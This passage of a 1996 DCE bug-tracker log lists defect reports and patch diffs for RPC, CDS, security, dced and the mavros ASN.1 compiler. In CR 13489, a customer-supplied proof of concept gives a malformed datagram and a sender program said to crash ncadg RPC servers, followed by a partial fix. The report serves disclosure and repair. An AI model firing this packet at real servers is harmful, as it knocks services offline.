          rpc__nsentry_free (&nsentry, &temp_status); 
!         return; 
      }
  
      /*
--- 329,335 ----
          (*status != rpc_s_entry_already_exists))
      {
          rpc__nsentry_free (&nsentry, &temp_status); 
!         goto CLEANUP; 
      }
  
      /*
***************
*** 438,444 ****
          rpc_binding_vector_free (&binding_vec_copy, &temp_status);
      }
  
!     rpc__nsentry_free (&nsentry, &temp_status); 
  
      return;
  
--- 448,457 ----
          rpc_binding_vector_free (&binding_vec_copy, &temp_status);
      }
  
!     if (nsentry != NULL)
!     {
!       rpc__nsentry_free (&nsentry, &temp_status); 
!     }
  
      return;
  

There were two uninitialized memory reads in nslookup.  Here is a delta
that fixes the problem:

Change: rpc/runtime/nslookup.c from 12.1 to 12.5
*** rpc/runtime/nslookup.c
***************
*** 3062,3070 ****
           * current member element - if they're equal, check their
           * predecessors.  If predecessors are equal too, report a cycle
           */
!         if ((memcmp ((char *) (nsentry->name), 
                  (char *) (lookup_member->name->name),
!                 nsentry->name_length)) == 0)
          {
              /*
               * get the predecessor of the non_leaf_list node -
--- 3081,3090 ----
           * current member element - if they're equal, check their
           * predecessors.  If predecessors are equal too, report a cycle
           */
!         if ((lookup_member->name->name_length == nsentry->name_length) &&
!             ((memcmp ((char *) (nsentry->name),
                  (char *) (lookup_member->name->name),
!                 nsentry->name_length)) == 0))
          {
              /*
               * get the predecessor of the non_leaf_list node -
***************
*** 3089,3097 ****
                   * first element) with the matching non_leaf node's
                   * predecessor.
                   */
!                 if ((memcmp ((char *)last_non_leaf_member->name->name,
                          (char *) (prev_lookup_member->name->name),
!                         last_non_leaf_member->name->name_length)) == 0)
                  {
                      *status = rpc_s_cycle_detected;
                      return (true);
--- 3109,3119 ----
                   * first element) with the matching non_leaf node's
                   * predecessor.
                   */
!                 if ((last_non_leaf_member->name->name_length ==
!                     prev_lookup_member->name->name_length) &&
!                     ((memcmp ((char *)last_non_leaf_member->name->name,
                          (char *) (prev_lookup_member->name->name),
!                         last_non_leaf_member->name->name_length)) == 0))
                  {
                      *status = rpc_s_cycle_detected;
                      return (true);
***************
*** 2337,2343 ****
      rpc_tower_ref_p_t       tower_ref;
      rpc_nsentry_p_t         nsentry_name,
                              nsentry_inq;
!     boolean                 got_obj_uuid;
      unsigned32              temp_status;
          
  
--- 2344,2350 ----
      rpc_tower_ref_p_t       tower_ref;
      rpc_nsentry_p_t         nsentry_name,
                              nsentry_inq;
!     boolean                 got_obj_uuid=false;
      unsigned32              temp_status;



CR Number                     : 13532
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : sinix
Component Name                : thr
Subcomponent Name             : 
Short Description             : SVR4 keyboard polling problems
Reported Date                 : 5/20/96
Found in Baseline             : 1.1
Found Date                    : 10/4/95
Severity                      : A
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : threads/SVR4/cma_thread_io.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[6/20/96 public]

A customer reported the following:

Full Description:

       In cma__io_available routine fd = 0 is not handled.
       A simple polling in a test program does not work and
       causes a threads crash.
This is a test program that shows the problem:

#include <signal.h>                                                             
#include <poll.h>                                                               
#include <dce/cts_test.h>                                                       

void do_exit();                                                                 
main( argc,  argv, environ)                                                     
int argc; char *argv[]; char **environ;                                         
{                                                                               
     unsigned char c;                                                           
     struct pollfd fds;                                                         
     signal(SIGINT, do_exit);                                                   
     signal(SIGQUIT, do_exit);                                                  
     fds.events = POLLIN;                                                       
     fds.fd = 0;                                                                
     cts_test ("PRVI_WRP_001", "Test Keyboard polling capability-please enter a char and then press return"); 
     poll(&fds,1, -1);                                                          
     if((fds.revents & POLLIN) != POLLIN)                                       
            printf("POLLIN not set\n");                                         
     else                                                                       
     {                          
            read(0, &c, 1);                                                     
            printf(" (character is '%c')\n", c);                                
     }                                                                          
     cts_result ();                                                             
}                                                                               
void do_exit()                                                                  
{                                                                               
   printf("exiting...\n");                                                      
}                                                                               
                                                                                
  
Repeat By:


Proposed Solution:

        After long debugging I found the solution:
        Module: cma__thread_io.c
        routine: cma__io_available
        (line 983 of module, 183 of the subroutine)
                        *  See if any files that the thread is polling          
                        *  are ready.                                           
                        */                                                      
                        i = select_tcb->select.poll_info.nfds;                  
                        poll_e_p = select_tcb->select.poll_info.poll_e_p;       
                        nfound = 0;                                             
                                                                                
                        while ( ( i > 0 ) && ( nfound < result ) )              
                                {                                               
                                cma_t_integer   tmp_fd = poll_e_p->fd;          
                                                                                
                                /*if ( tmp_fd > 0 ) */                          
/*------> This is the correction*/ if ( tmp_fd >= 0 ) /* tk */                     
                                        {                                       
                                        /*



CR Number                     : 13531
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : always check return from malloc()
Reported Date                 : 6/20/96
Found in Baseline             : 1.1
Found Date                    : 6/20/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/20/96 public]

Several files in src/security/krb5/lib/mvr never check the pointer
returned from malloc for failure:
decode.c encode.c krb5-glue.c krb5-manual-glue.c



CR Number                     : 13529
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : fts
Short Description             : fts/runtest obscures returned status.
Reported Date                 : 6/18/96
Found in Baseline             : 1.2
Found Date                    : 6/18/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/18/96 public]
fts/runtests does the following:

       if [ "$FTS_VERBOSE" = "ON" ]
       then
          sh -x $TESTTOP/$test > $outfile 2>&1; rf=$?
       else
          sh $TESTTOP/$test  > $outfile 2>&1; rf=$?
       fi
       if [ $rf -ne 0 ]
       then
		(echo ""; echo "Iteration $t process $pr test $test FAILED
with exit status $rf") | tee -a $lf
       fi
	
       rf=$?; rc=`expr $rc + $rf`

In the last line, the value that rf should have is overwritten by the
"if...;then echo...;fi" statement. This value is usually 0. The fix is
to simply remove "rf=$?; " from the last line.



CR Number                     : 13503
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : uninitialized pointer in db_btree_remove_entry
Reported Date                 : 6/13/96
Found in Baseline             : 1.1
Found Date                    : 6/13/96
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : directory/cds/server/db_btree.c
Diff supplied by              : osf
Diff release                  : 1.2.2
Sensitivity                   : public

[6/13/96 public]


cdsd was core dumping with a SEGV when serviceability was enabled.  The
reason was an uninitialized pointer that was being referenced inside
a serviceability message.  Here is the diff:

Change: directory/cds/server/db_btree.c from 12.6 to 12.9
*** directory/cds/server/db_btree.c
*** 4186,4191 ****
--- 4194,4200 ----
        ctx.ctx_hash_p = hash_p;
        ctx.ctx_key_p = ekey_p;
        ctx.ctx_stream_p = stream_p;
+       ctx.ctx_allupto_p = NULL;
  
        child.prm_key_p = NULL;
        child.prm_index_p = hash_p->dir_entry_p;

[10/8/96 public]

  Fix was submitted to 1.1 maintenance tree.

./directory/cds/server/db_btree.c
Comparing revision 1.1.13.1 with revision 1.1.13.2.
*** 1.1.13.1    1996/01/24 23:36:40
--- 1.1.13.2    1996/10/08 18:08:58
***************
*** 4139,4144 ****
--- 4143,4149 ----
        ctx.ctx_hash_p = hash_p;
        ctx.ctx_key_p = ekey_p;
        ctx.ctx_stream_p = stream_p;
+       ctx.ctx_allupto_p = NULL;               /* OT 13503 */
  
        child.prm_key_p = NULL;
        child.prm_index_p = hash_p->dir_entry_p;

[12/6/96 public]
I concur with the above.  This was unable to get integrated into R1.2.2
because of scheduling difficulties.  Here's the diff against R1.2.2b4 as
another reference point.  "<" is R1.2.2b4, ">" is fix:

9a10
>  * OT 13503 fix: in db_btree_remove_entry, initialize ctx.ctx_allupto_p = NULL.
4184a4186
>       ctx.ctx_allupto_p = NULL;



CR Number                     : 13497
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : gds
Subcomponent Name             : mavros
Short Description             : mavros doesn't detect ambiguous ASN.1
Reported Date                 : 6/7/96
Found in Baseline             : 1.2.1
Found Date                    : 6/7/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : directory/gds/MAVROS/mavrospro.c
Diff supplied by              : user
Diff release                  : 1.2.1
Sensitivity                   : public

[6/7/96 public]

1) mavros would in some cases emit error messages and yet exit with a zero
exit status indicating success.

The first change below, in conjunction with the (separately filed) Makefile
change, fixes this.

2) mavros would accept ambiguous ASN.1 descriptions without
complaint.

Specifically, if you have a definition like:

ASN_Abuse ::= SEQUENCE {
	one	INTEGER OPTIONAL,
	two	INTEGER OPTIONAL,
}

There is no way to distinguish from the incoming DER/BER stream which
contains a single INTEGER whether it's "one" or "two".

The second change detects the cases where the tags on an OPTIONAL field are
indistinguishable from the tags on a subsequent field.

These changes will be in a future HP 1.2.2 drop.

*** mavrospro.c@@/main/sommerfeld_pk_kdc/0      Thu Jun  6 10:50:20 1996
--- mavrospro.c@@/main/sommerfeld_pk_kdc/LATEST Fri Jun  7 13:48:11 1996
***************
*** 172,177 ****
--- 176,182 ----
        if (s2 == 0 || (strlen(s1) + strlen(s2)) > 252)
                yyerror(s1);
        else{   
+               ++ yynerrs;
                (void)(void)fprintf(stderr,"\"%s\", line %d: %s (%s).\n", 
                filein, last_error = linenum, s1, s2);
                last_error = linenum;
***************
*** 414,419 ****
--- 419,460 ----
                        verify_comp(&complist[i_comp],0,i_comp);
                }
        }
+ 
+       /*
+        * [1996/06/06  10:51:48  sommerfeld] detect case where
+        * OPTIONAL field followed by something with exact same tag..
+        */
+       for (i_comp=0; i_comp < compindex; i_comp++)
+       {
+           struct comp *c = &complist[i_comp];
+           struct comp *d;
+           int next;
+           
+           if (c->c_optional == 1)
+           {
+               for (next = c->c_brother;
+                    next != -1;
+                    next = d->c_brother)
+               {
+                   d = &complist[next];
+                   if ((c->c_mode == d->c_mode) &&
+                       (c->c_number == d->c_number) &&
+                       (asnstruct(c) == asnstruct(d)))
+                   {
+                       char errbuf[1024];
+                       linenum = c->c_line_num;
+                       sprintf(errbuf, "Type of `%s' indistinguishable from successor `%s'",
+                               c->c_id?c->c_id:c->c_name,
+                               d->c_id?d->c_id:d->c_name);
+                       
+                       stxerr("Ambiguous OPTIONAL", errbuf);
+                   }
+                   if (d->c_optional == 0)
+                       break;
+               }
+           }
+       }
+ 
  #ifdef DEBUGTREE
  (void)fprintf(stderr,"All types verified!\n");
  #endif



CR Number                     : 13496
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : gds
Subcomponent Name             : mavros/mavcod
Short Description             : error messages nonsensical on HP-UX
Reported Date                 : 6/7/96
Found in Baseline             : 1.2.1
Found Date                    : 6/5/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
	directory/gds/MAVROS/Makefile
	directory/gds/MAVCOD/Makefile
Diff supplied by              : user
Diff release                  : 1.2.2
Sensitivity                   : public

[6/7/96 public]

The mavros and mavcod compilers are built with -DYY_ERR_MSG, which assumes
that yyerror() takes two arguments.  on hp-ux, it only takes one argument.

The net result of this is that error messages for invalid input do not
indicate the source line in error or the identifier which caused the
problem.

Also, the makefiles have spurious dependancies on /usr/lib/lex/* and
/usr/lib/yaccpar

Makefile diffs follow; this fix will be in a future HP drop of 1.2.2.

directory/gds/MAVROS/Makefile:

*** Makefile@@/main/sommerfeld_pk_kdc/0 Wed Jun  5 17:07:45 1996
--- Makefile@@/main/sommerfeld_pk_kdc/LATEST    Wed Jun  5 17:54:42 1996
***************
*** 91,97 ****
  
  EXPDIR                = /usr/bin/
  YFLAGS                = -dv
! HP800_CFLAGS  += -D_NO_SETLOCALE
  CFLAGS                += -DYY_ERR_MSG -DSYS5 -DXOS
${${TARGET_MACHINE}_CFLAGS}
  
  mavros_EXPDIR = /usr/bin/
--- 98,104 ----
  
  EXPDIR                = /usr/bin/
  YFLAGS                = -dv
! HP800_CFLAGS  += -D_NO_SETLOCALE -UYY_ERR_MSG
  CFLAGS                += -DYY_ERR_MSG -DSYS5 -DXOS
${${TARGET_MACHINE}_CFLAGS}
  
  mavros_EXPDIR = /usr/bin/
***************
*** 102,116 ****
                mavros.o \
                mavrosinout.o   mavroscpy.o     mavrosbase.o \
                mavrosprt.o     mavrosincl.o    mavroslw.o 
- 
  
  .include <${RULES_MK}>
  
! lex.yy.c: mavros.lex /usr/lib/lex/ncform  /usr/lib/lex/nrform
        -@: # LC_CTYPE='${LC_CTYPE:UC:S/^POSIX$/C/}'
LC_ALL='${LC_ALL:UC:S/^POSIX$/C/}' LANG='${LANG:UC:S/^POSIX$/C/}'
        ${LEX} ${mavros.lex:P}
  
! y.tab.c: mavros.gr /usr/lib/yaccpar
        -@: # LC_CTYPE='${LC_CTYPE:UC:S/^POSIX$/C/}'
LC_ALL='${LC_ALL:UC:S/^POSIX$/C/}' LANG='${LANG:UC:S/^POSIX$/C/}'
        ${YACC} -dv ${mavros.gr:P}
  
--- 109,123 ----
                mavros.o \
                mavrosinout.o   mavroscpy.o     mavrosbase.o \
                mavrosprt.o     mavrosincl.o    mavroslw.o 
  
+ 
  .include <${RULES_MK}>
  
! lex.yy.c: mavros.lex
        -@: # LC_CTYPE='${LC_CTYPE:UC:S/^POSIX$/C/}'
LC_ALL='${LC_ALL:UC:S/^POSIX$/C/}' LANG='${LANG:UC:S/^POSIX$/C/}'
        ${LEX} ${mavros.lex:P}
  
! y.tab.c: mavros.gr
        -@: # LC_CTYPE='${LC_CTYPE:UC:S/^POSIX$/C/}'
LC_ALL='${LC_ALL:UC:S/^POSIX$/C/}' LANG='${LANG:UC:S/^POSIX$/C/}'
        ${YACC} -dv ${mavros.gr:P}
  


directory/gds/MAVCOD/Makefile:
*** Makefile@@/main/sommerfeld_pk_kdc/0 Wed Jun  5 17:18:57 1996
--- Makefile@@/main/sommerfeld_pk_kdc/LATEST    Wed Jun  5 17:55:05 1996
***************
*** 87,93 ****
  
  EXPDIR                = /usr/bin/
  YFLAGS                = -dv
! HP800_CFLAGS  += -D_NO_SETLOCALE
  CFLAGS                += -DYY_ERR_MSG -DSYS5 -DXOS
${${TARGET_MACHINE}_CFLAGS}
  LFLAGS                = -I../ASN1 -DDEBUG
  
--- 94,100 ----
  
  EXPDIR                = /usr/bin/
  YFLAGS                = -dv
! HP800_CFLAGS  += -D_NO_SETLOCALE -UYY_ERR_MSG
  CFLAGS                += -DYY_ERR_MSG -DSYS5 -DXOS
${${TARGET_MACHINE}_CFLAGS}
  LFLAGS                = -I../ASN1 -DDEBUG
  
***************
*** 98,108 ****
  
  .include <${RULES_MK}>
  
! y.tab.c: mavcod.gr /usr/lib/yaccpar
        -@: # LC_CTYPE='${LC_CTYPE:UC:S/^POSIX$/C/}'
LC_ALL='${LC_ALL:UC:S/^POSIX$/C/}' LANG='${LANG:UC:S
/^POSIX$/C/}'
        ${YACC} -dv ${mavcod.gr:P}
  
! lex.yy.c: mavcod.lex /usr/lib/lex/ncform  /usr/lib/lex/nrform
        -@: # LC_CTYPE='${LC_CTYPE:UC:S/^POSIX$/C/}'
LC_ALL='${LC_ALL:UC:S/^POSIX$/C/}' LANG='${LANG:UC:S
/^POSIX$/C/}'
        ${LEX} ${mavcod.lex:P}
  
--- 105,115 ----
  
  .include <${RULES_MK}>
  
! y.tab.c: mavcod.gr
        -@: # LC_CTYPE='${LC_CTYPE:UC:S/^POSIX$/C/}'
LC_ALL='${LC_ALL:UC:S/^POSIX$/C/}' LANG='${LANG:UC:S
/^POSIX$/C/}'
        ${YACC} -dv ${mavcod.gr:P}
  
! lex.yy.c: mavcod.lex
        -@: # LC_CTYPE='${LC_CTYPE:UC:S/^POSIX$/C/}'
LC_ALL='${LC_ALL:UC:S/^POSIX$/C/}' LANG='${LANG:UC:S
/^POSIX$/C/}'
        ${LEX} ${mavcod.lex:P}



CR Number                     : 13495
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : sec_rgy_unix_getgr* routines
ignore group_override
Reported Date                 : 6/6/96
Found in Baseline             : 1.1
Found Date                    : 6/6/96
Severity                      : B
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : client/rca/unix.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[6/6/96 public]

The sec_rgy_unix_getgr* routines do not extract information from
the group_override file.  Since the sec_rgy_unix_getpw* routines get
override information from the passwd_override file, the sec_rgy_unix_getgr*
routines should get override information as well.

The following diff has new code to do this.  Note that the override lookup
does not handle the member list correctly when the number of members 
exceeds max_num_members.  But the existing  sec_rgy_unix_getgr* API doesn't
get this right either.


DIFFS unix.c_new unix.c_1.1

134,141d133
< PRIVATE void rgy_grp_override_entry (
<     sec_rgy_unix_group_t    *grp,
<     signed32                 max_num_members,
<     signed32                 *num_supplied,
<     sec_rgy_member_t         members[],
<     error_status_t          *st
< );
< 
355d346
<     sec_override_fields_t  overridden;
368,371d358
<     if (*status == error_status_ok) {
<         rgy_grp_override_entry(group_entry, max_num_members,
&ret_members, members, status);
<       }
< 
374d360
< 
420,423d405
<     if (*status == error_status_ok) {
<         rgy_grp_override_entry(group_entry, max_num_members,
&ret_members, members, status);
<       }
< 
479,482d460
<     if (*status == error_status_ok) {
<         rgy_grp_override_entry(group_entry, max_num_members,
&ret_members, members, status);
<       }
< 
549,572d526
< }
< 
< PRIVATE void rgy_grp_override_entry (
<     sec_rgy_unix_group_t    *grp,
<     signed32                 max_num_members,
<     signed32                 *num_supplied,
<     sec_rgy_member_t         members[],
<     error_status_t          *st
< )
< 
< {
<   sec_rgy_cursor_t               mem_cursor;
<   sec_rgy_unix_passwd_buf_t      gr_passwd;
<   sec_group_override_fields_t    overridden = false;
<   signed32                       num_members;
<    
<   sec_rgy_cursor_reset(&mem_cursor);
<   gr_passwd[0] = '\0';
<  
<   override_get_group_info(grp->name, max_num_members, &(grp->gid),
&mem_cursor, gr_passwd, 
<                                               members, num_supplied,
&num_members, &overridden, st);
< 
<   if (*st == sec_login_s_no_override_info || *st ==
sec_login_s_ovrd_ent_not_found)
<          *st = error_status_ok;



CR Number                     : 13494
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : dced_wait_for_sec
Short Description             : dced_wait_for_sec can hang if a secd is down
Reported Date                 : 6/6/96
Found in Baseline             : 1.1
Found Date                    : 6/6/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : src/admin/dced/server/main.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[6/6/96 public]

In dced_wait_for_sec, if the sec_rgy_site_bind() returns a handle to
a server that is unavailable (which it shouldn't, but that's another
story), or if the server goes down before the call to
sec_rgy_pgo_name_to_id(), the sec_rgy_pgo_name_to_id() loop will loop
until that server comes back up.

It should dispose of the binding it has and try to get another one.
The diffs included in this OT will make it do so.  (However, that will
not fix the problem, because currently, sec_rgy_site_bind() will keep
returning the same cached handle to the same unavailable server.  I am
working on a fix for that too, which I will submit when it's done.
When that's fixed, the advantage that this diff gives will kick in.)
Given, if _all_ secds are down, then it should wait, but if one
of them is up, it should get the opportunity to find it.

To exploit the problem: configure a cell with one slave security
server, and ensure that the pe_site file on the master machine has
both sites' info in it.  Stop all DCE services on both machines,
and then try to restart DCE on the master machine.  dced will bind
to the slave, and the secval service will never activate until the
slave comes up, because it will loop in dced_wait_for_sec.  (Note
the caveat above that this is only half of the solution for that.)

Also, some dce_svc_printf() calls were missing a status parameter.

This diff is against the 1.1 code, but the 1.2.1 base has the same set
of problems.


*** 12.11	1995/09/29 15:59:52
--- 12.15	1996/06/06 14:36:27
***************
*** 441,453 ****
      uuid_create_nil(&thishost_prin_uuid, st);
      uuid_create_nil(&this_cell_uuid, st);
  
      /* Wait for secd to show up */
      for ( ; ; ) {
          auth.info_type = sec_rgy_bind_auth_none;
          sec_rgy_site_bind(NULL, &auth, &rh, st);
          if (*st == error_status_ok)
              break;
!         dce_svc_printf(DCED_S_WAITING_FOR_SOMETHING_MSG, "secd");
          dced_sleep(10);
      }
  
--- 458,471 ----
      uuid_create_nil(&thishost_prin_uuid, st);
      uuid_create_nil(&this_cell_uuid, st);
  
+   do {
      /* Wait for secd to show up */
      for ( ; ; ) {
          auth.info_type = sec_rgy_bind_auth_none;
          sec_rgy_site_bind(NULL, &auth, &rh, st);
          if (*st == error_status_ok)
              break;
!         dce_svc_printf(DCED_S_WAITING_FOR_SOMETHING_MSG, "secd", (long)*st);
          dced_sleep(10);
      }
  
***************
*** 456,467 ****
          strcpy((char *)prin_in_rgy, thishost_prin);
          sec_rgy_pgo_name_to_id(rh, sec_rgy_domain_person, prin_in_rgy,
                  &thishost_prin_uuid, st);
!         if (*st == error_status_ok)
              break;
!         dce_svc_printf(DCED_S_WAITING_FOR_SOMETHING_MSG, "machine principal");
          dced_sleep(10);
      }
  
      /* Wait for HOST/self keytab to be available */
      for ( ; ; ) {
          strcpy((char *)prin_in_rgy, thishost_prin);
--- 474,492 ----
          strcpy((char *)prin_in_rgy, thishost_prin);
          sec_rgy_pgo_name_to_id(rh, sec_rgy_domain_person, prin_in_rgy,
                  &thishost_prin_uuid, st);
!         if (*st == error_status_ok || *st == sec_rgy_server_unavailable)
              break;
!         dce_svc_printf(DCED_S_WAITING_FOR_SOMETHING_MSG,
!                        "machine principal", (long)*st);
          dced_sleep(10);
      }
  
+     if (*st == sec_rgy_server_unavailable) {
+         error_status_t lst;
+         sec_rgy_site_close(rh, &lst);
+     }
+   } while (*st == sec_rgy_server_unavailable);
+ 
      /* Wait for HOST/self keytab to be available */
      for ( ; ; ) {
          strcpy((char *)prin_in_rgy, thishost_prin);
***************
*** 471,477 ****
              sec_key_mgmt_free_key(key, st);
              break;
          }
!         dce_svc_printf(DCED_S_WAITING_FOR_SOMETHING_MSG, "machine keytab");
          dced_sleep(10);
      }
  
--- 496,503 ----
              sec_key_mgmt_free_key(key, st);
              break;
          }
!         dce_svc_printf(DCED_S_WAITING_FOR_SOMETHING_MSG,
!                        "machine keytab", (long)*st);
          dced_sleep(10);
      }
  
***************
*** 496,502 ****
              rpc_c_authn_dce_secret, NULL, NULL, st);
          if (*st == error_status_ok)
              break;
!         dce_svc_printf(DCED_S_WAITING_FOR_SOMETHING_MSG, "rpc_server_register_auth_info");
          dced_sleep(10);
      }
  }
--- 522,529 ----
              rpc_c_authn_dce_secret, NULL, NULL, st);
          if (*st == error_status_ok)
              break;
!         dce_svc_printf(DCED_S_WAITING_FOR_SOMETHING_MSG,
!                        "rpc_server_register_auth_info", (long)*st);
          dced_sleep(10);
      }
  }



CR Number                     : 13489
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 13631
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : rpc/runtime/dglsn.c
Short Description             : bad packet crashes any ncadg
server except(rpcd/dced)
Reported Date                 : 6/1/96
Found in Baseline             : 1.0.3, 1.1
Found Date                    : 6/1/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/1/96 public]

A support customer reported the following:
==========================================

DCE: 1.0.3 and 1.1
Problem Description:
        A bad packet ( see attachment ) can crash any server exporting
        ncadg ( except rpcd/dced ). This program crashed DCE rpc servers
        running on 1.0.3 and 1.1 machines AIX, HP and NT regardless.


        RPC runtime does not check the validity of the address family
        in forwarded packets, much less that the forwarded packet 
        originated on the local machine. See attachment for a partial
        fix to this issue/ diff of rpc/runtime/dglsn.c

Test case:
        Compile and run the attached program after removing WSA... calls.

--=====================_830209947==_
Content-Type: text/plain; charset="us-ascii"
Content-Disposition: attachment; filename="badpkt.c"


unsigned char pkt[]  =
{
0x04,
0x00,
0x01,
0x00,
0x10,
0x00,
0x00,
0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0xDC,0xD2,0xCC,0x35,0x00,0x00,0x00,0x00,0x0D,0x00,0x00,0xC3,0x66,0x00,0x00,0x00,
0xF0,0x62,0x66,0x00,0xE1,0xE1,0x17,0x17,0x83,0x37,0x00,0x00,0xC0,0xE2,0x6F,0x5F,
0x00,0x00,0x00,0x00,
0x01,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,
0x00,0x00,
0xFF,0xFF,
0xFF,0xFF,
0x00,0x00,
0x00,0x00,
0x00,
0x00,
0x10,0x00,0x00,0x00,
0x10,0x00,
0x00,0x00,0x02,0x00,0x08,0xC7,
0xC0,0x5C,0x6E,0xCE,
0x00,0x00,0x68,0xE3,0x0B,0xFF,0xC0,0x00
} ;


/*  Simple mail client to do smtp */
#define DEBUG  
#ifdef DEBUG 
#define dprintf(arg) printf("%s\n", arg)
#define dfmtprintf(args) printf(args)
#else
#define dprintf(arg)
#define dfmtprintf(args) 
#endif

#define xabort() { if ( d != -1 ) (void)closesocket(d); \
			(void)WSACleanup() ; abort () ; }
#define MYHOSTNAME "nehru"
#define LOCALPORT 0
#define MYUSERNAME "bhandaru"


#include <sys/types.h> 
#include <winsock.h>
#include <windows.h>


int usage ()
{
  exit(0);
}
int main ( int argc, char **argv )
{

 /* Usage: prog host port  <<EOF
    message
	EOF
  */
   char *pHost;
   unsigned short dport;
   struct sockaddr_in lsin, rsin;
   int  d = -1;
   int r;
   struct in_addr rinaddr, linaddr;
   WSADATA wsd;
   struct hostent *hp;
#define NSZ 100
   char myname[NSZ];
   int rsinlen, rlen;

   pHost = argv[1];
   dport = (unsigned short) atoi(argv[2]);

   WSAStartup(0x0101, &wsd);
   (void)memset(&rsin,0,sizeof(rsin));
   (void)memset(&lsin,0,sizeof(lsin));

   d = socket(AF_INET, SOCK_DGRAM, 0);
   if ( d == SOCKET_ERROR )  {
        (void)printf("Last error: %d\n", WSAGetLastError() );
	xabort ();
   }
   dprintf("Opened socket");

   hp = gethostbyname(pHost);
   if (!hp) xabort();
   rinaddr.s_addr = *(u_long *)hp->h_addr_list[0] ;
   dprintf("Got remote host addr");
   (void)printf("Addr: %s\n ", inet_ntoa(rinaddr));

   gethostname(myname, sizeof(myname));
   hp  = gethostbyname(myname);
   if (!hp) xabort ();
   linaddr.s_addr = *(u_long *)hp->h_addr_list[0] ;
   dprintf("Got local host addr");

   lsin.sin_family = AF_INET ;
   lsin.sin_addr = linaddr;
   lsin.sin_port = htons(LOCALPORT);
   if ( bind ( d, (struct sockaddr *)&lsin, sizeof(lsin)) == SOCKET_ERROR ) {
        (void)printf("Addr: %s Last error: %d\n", inet_ntoa(linaddr), 
				WSAGetLastError() );
		xabort ();
   }
   dprintf("Bound local address");
   
   rsin.sin_family = AF_INET ;
   rsin.sin_addr = rinaddr;
   rsin.sin_port = htons(dport);

   if (sendto(d,pkt,sizeof(pkt), 0, (struct sockaddr*)&rsin, sizeof(rsin))
	== SOCKET_ERROR ) {
        (void)printf("Addr: %s Last error: %d\n", inet_ntoa(linaddr), 
				WSAGetLastError() );
		xabort ();
   }
   Sleep(3000);
   rsinlen = sizeof(rsin);
   if ( rlen = 0 && (rlen = recvfrom(d,pkt,sizeof(pkt),0, (struct sockaddr*)&rsin, &rsinlen))
	 == SOCKET_ERROR ) {
        (void)printf("Addr: %s Last error: %d\n", inet_ntoa(linaddr), 
				WSAGetLastError() );
		xabort ();
   }
/*For now*/
#define print_bytes(p,l) printf("%30s\n", p)

   if ( rlen > 0 ) {
     print_bytes(pkt,rlen);
   }

   (void)closesocket(d);
   WSACleanup();
   return 0;
}

--=====================_830209947==_
Content-Type: text/plain; charset="us-ascii"
Content-Disposition: attachment; filename="diff.log"

===================================================================
RCS file: H:\dce32_rcs\src\rpc\runtime\dglsn.c,v
retrieving revision 1.10.1.4
diff -c -r1.10.1.4 c:\wk\sb\src\rpc\runtime\dglsn.c
*** C:/temp\T0002109	Mon Apr 22 13:42:10 1996
--- c:\wk\sb\src\rpc\runtime\dglsn.c	Mon Apr 22 11:43:04 1996
***************
*** 1709,1715 ****
      rpc__dg_convc_indy(&cas_uuid);
  }
  
! 
  
  /*
   * R E C V _ P K T
--- 1715,1737 ----
